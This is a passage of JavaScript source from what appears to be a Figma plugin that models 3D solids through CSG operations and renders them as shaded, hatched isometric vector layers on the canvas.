      const r = num(op.r, 50), ri = Math.max(0.5, Math.min(r - 0.5, num(op.ri, 30))), h = num(op.h, 80);
      return csgUnion(mesh, revolve([[ri, 0], [r, 0], [r, h], [ri, h]], num(op.segments, 48), "solid"));
    }
    case "torus": {
      const R = num(op.R, 60), r = Math.max(1, Math.min(R - 1, num(op.r, 16))), sides = Math.max(6, Math.round(num(op.sides, 16)));
      const prof = [];
      for (let i = 0; i < sides; i++) prof.push([R + r * Math.cos((i / sides) * Math.PI * 2), r + r * Math.sin((i / sides) * Math.PI * 2)]);
      return csgUnion(mesh, revolve(prof, num(op.segments, 40), "solid"));
    }
    case "prism": {
      const r = num(op.r, 50), h = num(op.h, 60), sides = Math.max(3, Math.min(64, Math.round(num(op.sides, 6))));
      return csgUnion(mesh, revolve([[0, 0], [r, 0], [r, h], [0, h]], sides, "solid"));
    }
    case "wedge": {
      const w = num(op.w, 120), d = num(op.d, 120), h = num(op.h, 80);
      const tri = [[0, 0], [w, 0], [0, -h]];
      return csgUnion(mesh, translatePolys(extrudeLoops([tri], profileTo3("left"), [0, -d, 0], "solid"), [0, d, 0]));
    }
    case "stairs": {
      const w = num(op.w, 120), d = num(op.d, 160), h = num(op.h, 100), n = Math.max(1, Math.min(24, Math.round(num(op.steps, 5))));
      let out = mesh;
      for (let i = 0; i < n; i++) out = csgUnion(out, boxPolys([0, 0, 0], [w, d - (i * d) / n, ((i + 1) * h) / n], "solid"));
      return out;
    }
    case "move":
      return translatePolys(mesh, [num(op.x, 0), num(op.y, 0), num(op.z, 0)]);
    case "scale": {
      if (!mesh.length) return mesh;
      const b = bounds3(mesh);
      const s = ["x", "y", "z"].map((k) => Math.max(0.01, num(op[k], 100) / 100));
      const c = [(b.min[0] + b.max[0]) / 2, (b.min[1] + b.max[1]) / 2, b.min[2]];
      return mesh.map((p) => {
        const v = p.v.map((q) => [0, 1, 2].map((k) => c[k] + (q[k] - c[k]) * s[k]));
        const n = v3.norm([p.n[0] / s[0], p.n[1] / s[1], p.n[2] / s[2]]);
        return { v, n, w: v3.dot(n, v[0]), kind: p.kind };
      });
    }
    case "size": {
      // Resize to an exact width / depth / height around the base centre.
      if (!mesh.length) return mesh;
      const b = bounds3(mesh);
      const s = ["w", "d", "h"].map((k, i) => {
        const ext = b.max[i] - b.min[i], target = num(op[k], ext);
        return ext > 0.01 && target > 0 ? target / ext : 1;
      });
      const c = [(b.min[0] + b.max[0]) / 2, (b.min[1] + b.max[1]) / 2, b.min[2]];
      return mesh.map((p) => {
        const v = p.v.map((q) => [0, 1, 2].map((k) => c[k] + (q[k] - c[k]) * s[k]));
        const n = v3.norm([p.n[0] / s[0], p.n[1] / s[1], p.n[2] / s[2]]);
        return { v, n, w: v3.dot(n, v[0]), kind: p.kind };
      });
    }
    case "mirror": {
      if (!mesh.length) return mesh;
      const k = AXES[op.axis] === undefined ? 0 : AXES[op.axis];
      const b = bounds3(mesh);
      const copy = op.copy !== false;
      // A copy mirrors across the far side (plus gap); a flip mirrors in place.
      const plane = copy ? b.max[k] + num(op.gap, 0) / 2 : (b.min[k] + b.max[k]) / 2;
      const flipped = mesh.map((p) => {
        const v = p.v.map((q) => { const r = q.slice(); r[k] = 2 * plane - q[k]; return r; }).reverse();
        const n = p.n.slice(); n[k] = -n[k];
        return { v, n, w: v3.dot(n, v[0]), kind: p.kind };
      });
      return copy ? csgUnion(mesh, flipped) : flipped;
    }
    case "array": {
      if (!mesh.length) return mesh;
      const k = AXES[op.axis] === undefined ? 0 : AXES[op.axis];
      const b = bounds3(mesh);
      const step = b.max[k] - b.min[k] + num(op.gap, 20);
      const count = Math.max(1, Math.min(32, Math.round(num(op.count, 3))));
      let out = mesh;
      for (let i = 1; i < count; i++) {
        const t = [0, 0, 0];
        t[k] = step * i;
        out = csgUnion(out, translatePolys(mesh, t));
      }
      return out;
    }
    case "radial": {
      if (!mesh.length) return mesh;
      const b = bounds3(mesh);
      const count = Math.max(1, Math.min(48, Math.round(num(op.count, 6))));
      const total = num(op.angle, 360);
      // Copies turn around a vertical axis `radius` behind the part's centre.
      const px = (b.min[0] + b.max[0]) / 2 - num(op.radius, 80), py = (b.min[1] + b.max[1]) / 2;
      const stepA = ((Math.abs(total) >= 360 ? total / count : total / Math.max(1, count - 1)) * Math.PI) / 180;
      let out = mesh;
      for (let i = 1; i < count; i++) {
        const a = stepA * i, ca = Math.cos(a), sa = Math.sin(a);
        const rot = (q) => [px + (q[0] - px) * ca - (q[1] - py) * sa, py + (q[0] - px) * sa + (q[1] - py) * ca, q[2]];
        out = csgUnion(out, mesh.map((p) => {
          const v = p.v.map(rot);
          const n = [p.n[0] * ca - p.n[1] * sa, p.n[0] * sa + p.n[1] * ca, p.n[2]];
          return { v, n, w: v3.dot(n, v[0]), kind: p.kind };
        }));
      }
      return out;
    }
    case "facepush":
      return facePush(op, mesh);
    case "loopcut":
      return loopCut(op, mesh, ctx);
    case "segpush":
      return segmentPush(op, mesh, ctx);
    default:
      return mesh;
  }
}

// `ctx` collects loop-cut rings so they can be drawn and referenced.
function evaluateOps(ops, ctx) {
  const c = ctx || { loops: [], loopSets: {} };
  let mesh = [];
  for (const op of ops) if (op.enabled !== false) mesh = opMesh(op, mesh, c);
  return mesh;
}

// ---- rendering ----

function viewDir(t) {
  // Direction towards the viewer: the 3D vector that projects to a point.
  return v3.norm([1, 1, 2 * t.s]);
}

// CSG leaves T-junctions (a vertex of one face lying mid-edge on another).
// Splitting edges at those vertices gives every edge exactly one neighbour.
function fixTJunctions(polys) {
  const CELL = 24;
  const grid = new Map();
  const key = (x, y, z) => x + "," + y + "," + z;
  const seen = new Set();
  for (const p of polys) for (const v of p.v) {
    const id = v.map((c) => c.toFixed(3)).join(",");
    if (seen.has(id)) continue;
    seen.add(id);
    const k = key(Math.floor(v[0] / CELL), Math.floor(v[1] / CELL), Math.floor(v[2] / CELL));
    let list = grid.get(k);
    if (!list) grid.set(k, (list = []));
    list.push(v);
  }
  return polys.map((p) => {
    const out = [];
    for (let i = 0; i < p.v.length; i++) {
      const a = p.v[i], b = p.v[(i + 1) % p.v.length];
      out.push(a);
      const ab = v3.sub(b, a);
      const l2 = v3.dot(ab, ab);
      if (l2 < 1e-6) continue;
      const lo = [0, 1, 2].map((k) => Math.floor((Math.min(a[k], b[k]) - 0.01) / CELL));
      const hi = [0, 1, 2].map((k) => Math.floor((Math.max(a[k], b[k]) + 0.01) / CELL));
      const mids = [];
      for (let x = lo[0]; x <= hi[0]; x++) for (let y = lo[1]; y <= hi[1]; y++) for (let z = lo[2]; z <= hi[2]; z++) {
        for (const v of grid.get(key(x, y, z)) || []) {
          const t = v3.dot(v3.sub(v, a), ab) / l2;
          if (t <= 1e-4 || t >= 1 - 1e-4) continue;
          const onEdge = v3.add(a, v3.scale(ab, t));
          if (v3.len(v3.sub(v, onEdge)) > 0.005) continue;
          // Insert the point *on* this edge (not the neighbour's vertex) so the
          // face stays exactly planar.
          mids.push([t, onEdge]);
        }
      }
      mids.sort((m, n) => m[0] - n[0]);
      let lastT = 0;
      for (const [t, v] of mids) if (t - lastT > 1e-5) { out.push(v); lastT = t; }
    }
    return { v: out, n: p.n, w: p.w, kind: p.kind };
  });
}

// ---- orientation ----
// A solid can be rotated for display (spin around its vertical axis, then
// tilt and roll) about a fixed pivot. Modelling stays in the solid's own axes.

function rotMatrix(rot) {
  const r = (d) => (num(d, 0) * Math.PI) / 180;
  const [cx, sx] = [Math.cos(r(rot.x)), Math.sin(r(rot.x))];
  const [cy, sy] = [Math.cos(r(rot.y)), Math.sin(r(rot.y))];
  const [cz, sz] = [Math.cos(r(rot.z)), Math.sin(r(rot.z))];
  const Rx = [[1, 0, 0], [0, cx, -sx], [0, sx, cx]];
  const Ry = [[cy, 0, sy], [0, 1, 0], [-sy, 0, cy]];
  const Rz = [[cz, -sz, 0], [sz, cz, 0], [0, 0, 1]];
  return matMul(Rx, matMul(Ry, Rz));
}

function matMul(A, B) {
  return A.map((row) => [0, 1, 2].map((j) => row[0] * B[0][j] + row[1] * B[1][j] + row[2] * B[2][j]));
}

const matT = (A) => [0, 1, 2].map((i) => [A[0][i], A[1][i], A[2][i]]);
const matVec = (A, v) => [v3.dot(A[0], v), v3.dot(A[1], v), v3.dot(A[2], v)];
const IDENTITY = [[1, 0, 0], [0, 1, 0], [0, 0, 1]];

function isRotated(data) {
  const r = data.rot;
  return !!r && (num(r.x, 0) !== 0 || num(r.y, 0) !== 0 || num(r.z, 0) !== 0);
}

// Model space -> view space for a solid.
function viewOf(data) {
  if (!isRotated(data)) return { R: IDENTITY, apply: (v) => v, applyN: (n) => n };
  const R = rotMatrix(data.rot);
  const p = data.pivot || [0, 0, 0];
  return { R, apply: (v) => v3.add(matVec(R, v3.sub(v, p)), p), applyN: (n) => matVec(R, n) };
}

function transformPolys(polys, fn, fnN) {
  return polys.map((p) => {
    const v = p.v.map(fn);
    const n = fnN(p.n);
    return { v, n, w: v3.dot(n, v[0]), kind: p.kind };
  });
}

// For every polygon edge, the polygons on the other side of it. After
// T-junction repair neighbours share exact endpoints, so a hash of the edge
// finds them directly; a spatial scan is only the fallback.
function edgeNeighbours(polys) {
  const q = (v) => Math.round(v[0] * 100) + "," + Math.round(v[1] * 100) + "," + Math.round(v[2] * 100);
  const ekey = (a, b) => { const ka = q(a), kb = q(b); return ka < kb ? ka + "|" + kb : kb + "|" + ka; };
  const byEdge = new Map();
  polys.forEach((p, pi) => {
    for (let i = 0; i < p.v.length; i++) {
      const k = ekey(p.v[i], p.v[(i + 1) % p.v.length]);
      const list = byEdge.get(k);
      if (list) list.push(pi); else byEdge.set(k, [pi]);
    }
  });
  let grid = null;
  const CELL = 24;
  const gkey = (x, y, z) => x + "," + y + "," + z;
  const buildGrid = () => {
    grid = new Map();
    polys.forEach((p, pi) => {
      for (let i = 0; i < p.v.length; i++) {
        const a = p.v[i], b = p.v[(i + 1) % p.v.length];
        const lo = [0, 1, 2].map((k) => Math.floor((Math.min(a[k], b[k]) - 0.05) / CELL));
        const hi = [0, 1, 2].map((k) => Math.floor((Math.max(a[k], b[k]) + 0.05) / CELL));
        for (let x = lo[0]; x <= hi[0]; x++) for (let y = lo[1]; y <= hi[1]; y++) for (let z = lo[2]; z <= hi[2]; z++) {
          const k = gkey(x, y, z);
          const list = grid.get(k);
          if (list) list.push([pi, a, b]); else grid.set(k, [[pi, a, b]]);
        }
      }
    });
  };
  const distToSeg = (m, a, b) => {
    const ab = v3.sub(b, a);
    const l2 = v3.dot(ab, ab);
    const t = l2 ? Math.max(0, Math.min(1, v3.dot(v3.sub(m, a), ab) / l2)) : 0;
    return v3.len(v3.sub(m, v3.add(a, v3.scale(ab, t))));
  };
  return polys.map((p, pi) => {
    const out = [];
    for (let i = 0; i < p.v.length; i++) {
      const a = p.v[i], b = p.v[(i + 1) % p.v.length];
      let found = (byEdge.get(ekey(a, b)) || []).filter((qi) => qi !== pi);
      if (!found.length) {
        if (!grid) buildGrid();
        const m = v3.lerp(a, b, 0.5);
        const dir = v3.norm(v3.sub(b, a));
        const list = grid.get(gkey(Math.floor(m[0] / CELL), Math.floor(m[1] / CELL), Math.floor(m[2] / CELL))) || [];
        found = [];
        for (const [qi, qa, qb] of list) {
          if (qi === pi || found.indexOf(qi) >= 0) continue;
          if (distToSeg(m, qa, qb) > 0.02) continue;
          if (v3.len(v3.cross(dir, v3.norm(v3.sub(qb, qa)))) > 0.02) continue;
          found.push(qi);
        }
      }
      out.push(found);
    }
    return out;
  });
}

// Marks the polygon edges that should be drawn: creases sharper than
// `smoothDeg`, silhouettes, and boundaries between different face kinds.
function featureFlags(polys, toViewer, smoothDeg, loops, neighbours) {
  const nbrs = neighbours || edgeNeighbours(polys);
  const rings = [];
  for (const L of loops || []) for (const t of L.ts) rings.push([L.k, t]);
  const smoothCos = Math.cos((smoothDeg * Math.PI) / 180);
  const front = polys.map((p) => v3.dot(p.n, toViewer) > 1e-6);
  const centroid = polys.map((p) => v3.scale(p.v.reduce((a, b) => v3.add(a, b), [0, 0, 0]), 1 / p.v.length));
  const curved = polys.map(() => false);
  const result = polys.map((p, pi) => {
    const flags = [];
    for (let i = 0; i < p.v.length; i++) {
      const a = p.v[i], b = p.v[(i + 1) % p.v.length];
      // Loop-cut rings are always drawn on faces they cross.
      let feature = rings.some(([k, t]) => Math.abs(a[k] - t) < 1e-3 && Math.abs(b[k] - t) < 1e-3 && Math.abs(p.n[k]) < 0.99);
      if (!feature) {
        let smooth = false;
        for (const qi of nbrs[pi][i]) {
          const q = polys[qi];
          if (q.kind !== p.kind || v3.dot(p.n, q.n) <= smoothCos) continue;
          // A back-facing neighbour is a silhouette only on convex curves;
          // inside a hollow it's hidden behind the rim anyway.
          if (front[qi] || v3.dot(p.n, centroid[qi]) - p.w > 1e-3) {
            if (v3.dot(p.n, q.n) < 1 - 1e-6) curved[pi] = true;
            smooth = true;
            break;
          }
        }
        feature = !smooth;
      }
      flags.push(feature);
    }
    return flags;
  });
  result.curved = curved;
  return result;
}

function shadeAmount(n, kind) {
  const k =
    0.14 * Math.max(0, n[0]) + 0.06 * Math.max(0, n[1]) +
    0.22 * Math.max(0, -n[0]) + 0.18 * Math.max(0, -n[1]) + 0.3 * Math.max(0, -n[2]) +
    (kind === "cut" ? 0.03 : 0);
  return Math.round(k * 50) / 50;
}

function faceIdentity(p, curved, loops) {
  const c = v3.scale(p.v.reduce((a, b) => v3.add(a, b), [0, 0, 0]), 1 / p.v.length);
  const bounds = [];
  for (const L of loops || []) {
    if (Math.abs(p.n[L.k]) > 0.99) continue; // face parallel to the rings
    const ts = L.ts.slice().sort((a, b) => a - b);
    let i = 0;
    while (i < ts.length && ts[i] < c[L.k]) i++;
    bounds.push([L.k, i > 0 ? round2(ts[i - 1]) : null, i < ts.length ? round2(ts[i]) : null]);
  }
  const n = p.n.map((x) => Math.round(x * 1e4) / 1e4);
  const w = round2(p.w);
  return { n, w, bounds, curved: !!curved, key: n.join(",") + "|" + w + "|" + bounds.map((b) => b.join(":")).join("/") };
}

function faceName(n) {
  const [x, y, z] = n;
  const m = Math.max(Math.abs(x), Math.abs(y), Math.abs(z));
  if (m < 0.95) return "slanted";
  if (Math.abs(z) === m) return z > 0 ? "top" : "bottom";
  if (Math.abs(y) === m) return y > 0 ? "left" : "back right";
  return x > 0 ? "right" : "back left";
}

const meshCache = { key: null, raw: null, ctx: null, mesh: null, nbrs: null };
const meshStore = new Map();

// Rendering is the expensive part; the canvas and the preview share it.
const renderCache = { key: null, runs: null };
function cachedRender(data) {
  const key = JSON.stringify([data.ops, data.rot, data.pivot, data.angle, data.smooth]);
  if (renderCache.key !== key) {
    renderCache.runs = renderSolid(data);
    renderCache.key = key;
  }
  return renderCache.runs;
}

// Evaluates a solid and returns draw-ordered runs in screen space
// (relative to the world origin):
// [{ shade, kind, polys: [[[x,y]…]…], edges: [[[x,y],[x,y]]…] }]
function renderSolid(data) {
  const t = trig(num(data.angle, 30));
  // Rotating or restyling doesn't change the model, so reuse the last mesh.
  const opsKey = JSON.stringify(data.ops);
  if (meshCache.key !== opsKey) {
    // A few recent meshes are kept, so scenes with many parts don't rebuild
    // every part's CSG on each redraw.
    let hit = meshStore.get(opsKey);
    if (hit) meshStore.delete(opsKey);
    else {
      const fresh = { loops: [], loopSets: {} };
      const raw = evaluateOps(data.ops, fresh);
      const mesh = raw.length ? fixTJunctions(raw) : [];
      hit = { raw, ctx: fresh, mesh, nbrs: edgeNeighbours(mesh) };
    }
    meshStore.set(opsKey, hit);
    if (meshStore.size > 32) meshStore.delete(meshStore.keys().next().value);
    meshCache.key = opsKey;
    meshCache.raw = hit.raw;
    meshCache.ctx = hit.ctx;
    meshCache.mesh = hit.mesh;
    meshCache.nbrs = hit.nbrs;
  }
  const ctx = meshCache.ctx;
  const raw = meshCache.raw;
  if (!raw.length) throw new Error("The result is empty — nothing left to draw.");
  const toViewer = viewDir(t);
  // Edges are classified in model space (where loop rings are axis-aligned),
  // then the mesh is turned to face the viewer.
  const view = viewOf(data);
  let mesh = meshCache.mesh;
  const flags = featureFlags(mesh, matVec(matT(view.R), toViewer), num(data.smooth, 40), ctx.loops, meshCache.nbrs);
  // Each flat face remembers which model face it is (plane + loop-cut strip)
  // so it can be selected on the canvas and extruded later.
  const srcs = mesh.map((p, i) => faceIdentity(p, flags.curved[i], ctx.loops));
  if (isRotated(data)) mesh = transformPolys(mesh, view.apply, view.applyN);
  const visible = [];
  mesh.forEach((p, i) => {
    if (v3.dot(p.n, toViewer) > 1e-6) visible.push({ v: p.v, n: p.n, w: p.w, kind: p.kind, flags: flags[i], src: srcs[i] });
  });

  // Back-to-front walk of a BSP tree gives an exact painter's order.
  const order = [];
  const stack = [new BSP(visible)];
  while (stack.length) {
    const item = stack.pop();
    if (Array.isArray(item)) { order.push.apply(order, item); continue; }
    if (!item || item.n === null) continue;
    const viewerInFront = v3.dot(item.n, toViewer) > 0;
    stack.push(viewerInFront ? item.front : item.back);
    stack.push(item.polys);
    stack.push(viewerInFront ? item.back : item.front);
  }

  // Consecutive faces share one layer when they have the same look and don't
  // overlap on screen — then their order within the layer doesn't matter.
  const proj = (v) => [(v[0] - v[1]) * t.c, (v[0] + v[1]) * t.s - v[2]];
  const runs = [];
  let run;
  for (const p of order) {
    const pts = p.v.map(proj);
    if (Math.abs(area2(pts)) < 1e-4) continue;
    const shade = shadeAmount(p.n, p.kind);
    const box = bbox2(pts);
    const faceKey = p.src && !p.src.curved ? p.src.key : null;
    const hits = (r) => r.polys.some((q, i) => boxesOverlap(r.boxes[i], box) && convexOverlap(q, pts));
    // Walk back through earlier layers: join a matching one as long as we
    // don't jump over anything this face overlaps.
    run = null;
    for (let k = runs.length - 1; k >= 0; k--) {
      const r = runs[k];
      const overlaps = hits(r);
      // Flat faces only share a layer with pieces of the same face, so a
      // layer is always one selectable face; curved facets merge freely.
      if (!overlaps && r.kind === p.kind && r.shade === shade && r.faceKey === faceKey) { run = r; break; }
      if (overlaps) break;
    }
    if (!run) {
      run = { kind: p.kind, shade, faceKey, face: faceKey ? p.src : null, polys: [], boxes: [], edges: [] };
      runs.push(run);
    }
    run.polys.push(pts);
    run.boxes.push(box);
    pts.forEach((a, i) => { if (p.flags[i]) run.edges.push([a, pts[(i + 1) % pts.length]]); });
  }
  // Kept for previews (ring outlines are traced on the model mesh).
  runs.model = raw;
  runs.ctx = ctx;
  runs.view = view;
  runs.trig = t;
  runs.toViewer = toViewer;
  return runs;
}

function bbox2(pts) {
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const p of pts) {
    minX = Math.min(minX, p[0]); maxX = Math.max(maxX, p[0]);
    minY = Math.min(minY, p[1]); maxY = Math.max(maxY, p[1]);
  }
  return [minX, minY, maxX, maxY];
}

function boxesOverlap(a, b) {
  return a[0] < b[2] && b[0] < a[2] && a[1] < b[3] && b[1] < a[3];
}

// Separating-axis test for convex polygons; touching along an edge doesn't count.
function convexOverlap(a, b) {
  for (const poly of [a, b]) {
    for (let i = 0; i < poly.length; i++) {
      const p = poly[i], q = poly[(i + 1) % poly.length];
      const ax = -(q[1] - p[1]), ay = q[0] - p[0];
      const l = Math.hypot(ax, ay);
      if (l < 1e-9) continue;
      let aMin = Infinity, aMax = -Infinity, bMin = Infinity, bMax = -Infinity;
      for (const v of a) { const d = (v[0] * ax + v[1] * ay) / l; aMin = Math.min(aMin, d); aMax = Math.max(aMax, d); }
      for (const v of b) { const d = (v[0] * ax + v[1] * ay) / l; bMin = Math.min(bMin, d); bMax = Math.max(bMax, d); }
      if (aMax <= bMin + 0.01 || bMax <= aMin + 0.01) return false;
    }
  }
  return true;
}

// 45° screen-space hatch lines clipped to a convex polygon.
function hatchSegments(pts, gap) {
  let lo = Infinity, hi = -Infinity;
  for (const p of pts) { lo = Math.min(lo, p[0] + p[1]); hi = Math.max(hi, p[0] + p[1]); }
  const out = [];
  for (let s = Math.ceil(lo / gap) * gap; s <= hi; s += gap) {
    const hits = [];
    for (let i = 0; i < pts.length; i++) {
      const a = pts[i], b = pts[(i + 1) % pts.length];
      const fa = a[0] + a[1] - s, fb = b[0] + b[1] - s;
      if ((fa < 0) !== (fb < 0)) {
        const k = fa / (fa - fb);
        hits.push([a[0] + (b[0] - a[0]) * k, a[1] + (b[1] - a[1]) * k]);
      }
    }
    if (hits.length >= 2) out.push([hits[0], hits[1]]);
  }
  return out;
}

function runBounds(runs) {
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const r of runs) for (const poly of r.polys) for (const p of poly) {
    minX = Math.min(minX, p[0]); maxX = Math.max(maxX, p[0]);
    minY = Math.min(minY, p[1]); maxY = Math.max(maxY, p[1]);
  }
  return { minX, minY, maxX, maxY };
}

// ---- Figma glue ----

// Absolute origin of the coordinate space a node's x/y live in.
function spaceOrigin(node) {
  let p = node.parent;
  while (p && p.type === "GROUP") p = p.parent;
  if (!p || p.type === "PAGE" || !("absoluteTransform" in p)) return { x: 0, y: 0 };
  return { x: p.absoluteTransform[0][2], y: p.absoluteTransform[1][2] };
}

function readSolid(node) {
  if (!node || node.type !== "GROUP") return null;
  const raw = node.getPluginData(SOLID_KEY);
  if (!raw) return null;
  try { return JSON.parse(raw); } catch (e) { return null; }
}

function findSolid(node) {
  for (let n = node; n && n.type !== "PAGE" && n.type !== "DOCUMENT"; n = n.parent) {
    if (readSolid(n)) return n;
  }
  return null;
}

function solidStyle(msg) {
  return {
    stroke: msg.stroke || "#2D55E8",
    fill: msg.fill || "#FFFFFF",
    strokeWeight: num(msg.strokeWeight, 1.25),
    gap: Math.max(2, num(msg.spacing, 6)),
  };
}

// Draws `data` into a group. `place` is either { group } to redraw an
// existing solid in place, or { container, center: {x, y} } (absolute) for a
// new one.
function drawSolid(data, place) {
  const runs = cachedRender(data);
  const style = data.style;
  const ink = hexToRgb(style.stroke);
  const base = hexToRgb(style.fill);
  const weight = num(style.strokeWeight, 1.25);

  let parent, anchor; // anchor: world origin in absolute coords
  if (place.group) {
    parent = place.group;
    const o = spaceOrigin(place.group);
    anchor = { x: o.x + place.group.x + data.dx, y: o.y + place.group.y + data.dy };
  } else if (place.anchor) {
    parent = place.container;
    anchor = place.anchor;
  } else {
    parent = place.container;
    const b = runBounds(runs);
    anchor = { x: place.center.x - (b.minX + b.maxX) / 2, y: place.center.y - (b.minY + b.maxY) / 2 };
  }
  const origin = place.group ? spaceOrigin(place.group) : parent.type === "PAGE" ? { x: 0, y: 0 } : { x: parent.absoluteTransform[0][2], y: parent.absoluteTransform[1][2] };
  const toLocal = (p) => [p[0] + anchor.x - origin.x, p[1] + anchor.y - origin.y];

  const nodes = [];
  runs.forEach((run, i) => {
    const color = mix(base, ink, run.shade);
    const segs = [];
    for (const poly of run.polys) {
      poly.forEach((p, k) => { const q = toLocal(p); segs.push([k ? "L" : "M", q[0], q[1]]); });
      segs.push(["Z"]);
    }
    // A hairline in the fill colour hides anti-aliasing seams between faces.
    const faceNode = makeVector(parent, run.kind === "cut" ? "Section" : run.face ? "Face · " + faceName(run.face.n) : "Surface", [segs], { fill: color, stroke: color, strokeWeight: 0.5 });
    if (run.face && run.kind !== "cut") faceNode.setPluginData(FACE_KEY, JSON.stringify({ n: run.face.n, w: run.face.w, bounds: run.face.bounds, key: run.face.key }));
    nodes.push(faceNode);

    if (run.kind === "cut") {
      // Hatch phase is tied to the canvas so neighbouring pieces line up.
      const hatch = [];
      for (const poly of run.polys) {
        const abs = poly.map((p) => [p[0] + anchor.x, p[1] + anchor.y]);
        for (const [a, b] of hatchSegments(abs, style.gap)) {
          hatch.push(["M", a[0] - origin.x, a[1] - origin.y], ["L", b[0] - origin.x, b[1] - origin.y]);
        }
      }
      if (hatch.length) nodes.push(makeVector(parent, "Hatch", [hatch], { stroke: ink, strokeWeight: Math.max(0.5, weight * 0.6) }));
    }
    const lines = [];
    for (const [a, b] of run.edges) {
      const p = toLocal(a), q = toLocal(b);
      lines.push(["M", p[0], p[1]], ["L", q[0], q[1]]);
    }
    if (lines.length) nodes.push(makeVector(parent, "Edges", [lines], { stroke: ink, strokeWeight: weight }));
  });

  let group;
  if (place.group) {
    group = place.group;
    for (const child of group.children.slice()) if (nodes.indexOf(child) === -1) child.remove();
  } else {
    group = figma.group(nodes, parent);
    group.name = data.name || "Solid";
  }
  const o = spaceOrigin(group);
  data.dx = anchor.x - o.x - group.x;
  data.dy = anchor.y - o.y - group.y;
  group.setPluginData(SOLID_KEY, JSON.stringify(data));
  try { group.expanded = false; } catch (e) { /* not supported everywhere */ }
  return group;
}

// Rendering happens before any node is touched, so a failing edit leaves the
// solid as it was.
function saveSolid(group, data) {
  return drawSolid(data, { group });
}

// ---- reading flat shapes ----

function sampleSegs(segs) {
  const loops = [];
  let cur = null, last = null, start = null;
  const pushPt = (p) => { cur.push(p); last = p; };
  for (const s of segs) {
    if (s[0] !== "M" && s[0] !== "Z" && cur && !cur.length) pushPt(start); // subpath restarts after Z
    if (s[0] === "M") { if (cur && cur.length) loops.push(cur); cur = []; pushPt([s[1], s[2]]); start = last; }
    else if (s[0] === "L") pushPt([s[1], s[2]]);
    else if (s[0] === "Q" || s[0] === "C") {
      const ctrl = s[0] === "Q" ? [[s[1], s[2]], [s[3], s[4]]] : [[s[1], s[2]], [s[3], s[4]], [s[5], s[6]]];
      const pts = [last].concat(ctrl);
      let L = 0;
      for (let i = 1; i < pts.length; i++) L += Math.hypot(pts[i][0] - pts[i - 1][0], pts[i][1] - pts[i - 1][1]);
      const n = Math.max(2, Math.min(24, Math.ceil(L / 6)));
      for (let i = 1; i <= n; i++) {
        const t = i / n, u = 1 - t;
        if (pts.length === 3) pushPt([u * u * pts[0][0] + 2 * u * t * pts[1][0] + t * t * pts[2][0], u * u * pts[0][1] + 2 * u * t * pts[1][1] + t * t * pts[2][1]]);
        else pushPt([
          u * u * u * pts[0][0] + 3 * u * u * t * pts[1][0] + 3 * u * t * t * pts[2][0] + t * t * t * pts[3][0],
          u * u * u * pts[0][1] + 3 * u * u * t * pts[1][1] + 3 * u * t * t * pts[2][1] + t * t * t * pts[3][1],
        ]);
      }
    } else if (s[0] === "Z") {
      if (cur && cur.length) loops.push(cur);
      cur = [];
      last = start;
    }
  }
  if (cur && cur.length) loops.push(cur);
  return loops.map(cleanLoop).filter((l) => l.length >= 3);
}

// Closed outlines of a flat layer, in absolute canvas coordinates.
function shapeLoops(node) {
  const copy = node.clone();
  const parent = node.parent;
  parent.insertChild(parent.children.indexOf(node) + 1, copy);
  let vec;
  try {
    vec = copy.type === "VECTOR" ? copy : figma.flatten([copy], parent, parent.children.indexOf(copy));
  } catch (e) {
    if (!copy.removed) copy.remove();
    throw new Error(`"${node.name}" can't be used as a profile.`);
  }
  const m = vec.absoluteTransform;
  const loops = [];
  for (const p of vec.vectorPaths) {
    for (const loop of sampleSegs(parsePath(p.data))) {
      loops.push(loop.map(([x, y]) => [m[0][0] * x + m[0][1] * y + m[0][2], m[1][0] * x + m[1][1] * y + m[1][2]]));
    }
  }
  vec.remove();
  if (!loops.length) throw new Error(`"${node.name}" has no closed outline to use as a profile.`);
  return loops;
}

const round2 = (n) => Math.round(n * 100) / 100;
const roundLoops = (loops) => loops.map((l) => l.map((p) => p.map(round2)));

function loopBounds(loops) {
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const l of loops) for (const p of l) {
    minX = Math.min(minX, p[0]); maxX = Math.max(maxX, p[0]);
    minY = Math.min(minY, p[1]); maxY = Math.max(maxY, p[1]);
  }
  return { minX, minY, maxX, maxY };
}

function selectionParts() {
  const solids = [], shapes = [], faces = [];
  for (const node of figma.currentPage.selection) {
    const s = findSolid(node);
    if (s) {
      if (solids.indexOf(s) === -1) solids.push(s);
      const raw = node !== s && node.type === "VECTOR" ? node.getPluginData(FACE_KEY) : "";
      if (raw) {
        try { faces.push({ node, solid: s, face: JSON.parse(raw) }); } catch (e) { /* ignore */ }
      }
    } else shapes.push(node);
  }
  return { solids, shapes, faces };
}

function containerOf(node) {
  let p = node.parent;
  while (p && p.type === "GROUP") p = p.parent;
  return p || figma.currentPage;
}

function newSolidData(msg, name, ops) {
  return { v: 1, name, angle: num(msg.angle, 30), smooth: 40, style: solidStyle(msg), ops, dx: 0, dy: 0 };
}

// ---- commands ----

function placeNew(data, msg, source) {
  if (source) {
    const b = source.absoluteBoundingBox;
    const container = containerOf(source);
    const center = { x: b.x + b.width / 2, y: b.y + b.height / 2 };
    if (msg.keep) {
      const r = runBounds(cachedRender(data));
      center.x = b.x + b.width + 40 + (r.maxX - r.minX) / 2;
    }
    const group = drawSolid(data, { container, center });
    if (!msg.keep) source.remove();
    return group;
  }
  const { parent } = insertionTarget();
  return drawSolid(data, { container: parent, center: viewportCenter() });
}

function cmdBox(msg) {
  const op = { type: "box", w: num(msg.w, 160), d: num(msg.d, 160), h: num(msg.h, 40) };
  const g = placeNew(newSolidData(msg, "Box", [op]), msg, null);
  figma.currentPage.selection = [g];
  return "Box created — edit it from the Edit tab.";
}

function cmdCylinder(msg) {
  const op = { type: "cylinder", r: num(msg.r, 50), h: num(msg.h, 80), segments: num(msg.segments, 48) };
  const g = placeNew(newSolidData(msg, "Cylinder", [op]), msg, null);
  figma.currentPage.selection = [g];
  return "Cylinder created.";
}

// Parametric primitives. Each becomes the first step of a new solid and
// stays editable in History.
const PRIMITIVES = {
  box: { name: "Box", keys: { w: 160, d: 160, h: 40 } },
  cylinder: { name: "Cylinder", keys: { r: 50, h: 80, segments: 48 } },
  sphere: { name: "Sphere", keys: { r: 60, segments: 32 } },
  cone: { name: "Cone", keys: { r1: 60, r2: 0, h: 100, segments: 40 } },
  tube: { name: "Tube", keys: { r: 60, ri: 40, h: 80, segments: 48 } },
